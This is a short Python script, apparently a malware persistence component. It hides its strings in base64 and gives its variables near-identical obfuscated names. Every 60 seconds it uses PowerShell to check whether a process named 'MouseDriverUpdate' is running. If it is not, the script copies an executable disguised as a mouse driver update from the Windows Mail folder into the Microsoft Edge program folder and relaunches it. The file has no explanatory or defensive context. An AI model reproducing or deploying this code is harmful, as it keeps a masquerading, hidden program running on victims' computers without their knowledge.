import subprocess
import base64
import os 
import time 

def power_run(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=False, close_fds=True)
    return completed
def LLLLLLLLLllllllllllllllLLlllll(LLLLLLLLLlllllllllllllllLLllll): 
    LLLLLLLLLlllllllllllllllLLllll = base64.b64decode(LLLLLLLLLlllllllllllllllLLllll)
    return LLLLLLLLLlllllllllllllllLLllll.decode()

LLLLLLLLllllllllllllllllLLllll=LLLLLLLLLllllllllllllllLLlllll("QzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxNaWNyb3NvZnRcRWRnZVxNb3VzZURyaXZlclVwZGF0ZS5leGU=")
LLLLLLLLllllllllllllllLLllllll=LLLLLLLLLllllllllllllllLLlllll("TW91c2VEcml2ZXJVcGRhdGU=")

LLLLLLLLlllllllllllllllllLLllll = LLLLLLLLLllllllllllllllLLlllll("R2V0LVByb2Nlc3MgLU5hbWU=")
LLLLLLLLLllllllllllllllllLLllll = LLLLLLLLLllllllllllllllLLlllll("ID4gUHJvY2Vzc2VzLnR4dA==")
LLLLLLLLllllllllllllllllLLlllll = LLLLLLLLlllllllllllllllllLLllll + " " + LLLLLLLLllllllllllllllLLllllll + LLLLLLLLLllllllllllllllllLLllll
LLLLLLLLllllllllllllllLLlllllll = LLLLLLLLLllllllllllllllLLlllll("QzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzIE1haWxcTW91c2VEcml2ZXJVcGRhdGUuZXhl")
while True:
    power_run(LLLLLLLLllllllllllllllllLLlllll)

    LLLLLLLLlllllllllllllllllLLllll = LLLLLLLLLllllllllllllllLLlllll("UHJvY2Vzc2VzLnR4dA==")
    LLLLLLLLlllllllllllllllllLLllll = os.getcwd() + "\\" + LLLLLLLLlllllllllllllllllLLllll
    LLLLLLLLLllllllllllllllllLLllll = os.path.getsize(LLLLLLLLlllllllllllllllllLLllll)
    if LLLLLLLLLllllllllllllllllLLllll == 0:
        command = "copy " + LLLLLLLLllllllllllllllLLlllllll + " " + LLLLLLLLllllllllllllllllLLllll
        os.system(command)
        subprocess.Popen([LLLLLLLLllllllllllllllllLLllll], close_fds=True)
    time.sleep(60)